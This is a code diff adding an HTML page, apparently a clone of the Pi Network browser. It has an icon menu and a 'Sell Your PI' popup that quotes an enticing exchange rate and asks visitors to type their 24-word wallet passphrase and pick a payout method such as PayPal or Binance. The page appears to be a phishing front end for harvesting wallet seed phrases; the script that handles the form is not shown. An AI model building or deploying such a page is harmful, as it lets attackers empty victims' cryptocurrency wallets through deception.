@@ -1,0 +1,118 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Browser Clone</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <header>
+        <nav>
+            <h1>
+                Home
+                <div class="logo-container">
+                    <img src="pi.png" alt="Logo" class="small-logo">
+                </div>
+
+            </h1>
+        </nav>
+    </header>
+
+    <main>
+        <section class="welcome">
+            <div class="logo">
+                <img src="pi.png" alt="Pi Logo">
+            </div>
+            <h2>Welcome to the Pi Browser</h2>
+        </section>
+
+        <section class="grid-menu">
+            <div class="grid-item">
+                <img src="fire.png" alt="Fireside">
+                <p>Fireside</p>
+            </div>
+            <div class="grid-item">
+                <img src="wallet.png" alt="Wallet">
+                <p>Wallet</p>
+            </div>
+            <div class="grid-item">
+                <img src="Brainstorm.png" alt="Brainstorm">
+                <p>Brainstorm</p>
+            </div>
+            <div class="grid-item">
+                <img src="Mine.png" alt="Mine">
+                <p>Mine</p>
+            </div>
+            <div class="grid-item" id="sell-btn">
+                <img src="sell.png" alt="Blockchain">
+                <p>Sell</p>
+            </div>
+            <div class="grid-item">
+                <img src="Develop.png" alt="Develop">
+                <p>Develop</p>
+            </div>
+            <div class="grid-item">
+                <img src="kyc.png" alt="KYC">
+                <p>KYC</p>
+            </div>
+            <div class="grid-item">
+                <img src="chat.png" alt="Chat">
+                <p>Chat</p>
+            </div>
+            <div class="grid-item">
+                <img src="Reward.png" alt="Profiles">
+                <p>Rewards</p>
+            </div>
+        </section>
+
+        <footer>
+            <button class="explore-btn">Explore the Ecosystem</button>
+        </footer>
+    </main>
+
+    <!-- Popup Modal for Sell Option -->
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <span id="close-btn" class="close-btn">&times;</span>
+            <nav>
+                <h1 style="text-align: center; margin: 20px 0;">
+                    Sell Your PI
+                    <div class="logo-container" style="display: inline-block; vertical-align: middle;">
+                        <img src="pi.png" alt="Logo" class="small-logo">
+                    </div>
+                </h1>
+            </nav>
+            <form id="sell-form">
+                <label for="pi-amount">Pi to Sell</label>
+                <!-- Pi Amount Input Field -->
+                <input type="number" id="pi-amount" placeholder="Enter Pi Amount" required>
+
+                <!-- Exchange Rate Text -->
+                <p id="exchange-rate-text" class="exchange-rate">1 Pi = 38.5 USD</p>
+
+                <label for="passphrase">Passphrase:</label>
+                <textarea id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
+
+                <label for="payment-method">Select Payment Method</label>
+                <select id="payment-method" name="payment-method" required>
+                    <option value="paypal">PayPal</option>
+                    <option value="payoneer">Payoneer</option>
+                    <option value="bank-transfer">Bank Transfer</option>
+                    <option value="easypaisa">EasyPaisa</option>
+                    <option value="jazzcash">JazzCash</option>
+                    <option value="binance">Binance</option>
+                </select>
+
+                <button type="submit">Confirm Sale</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
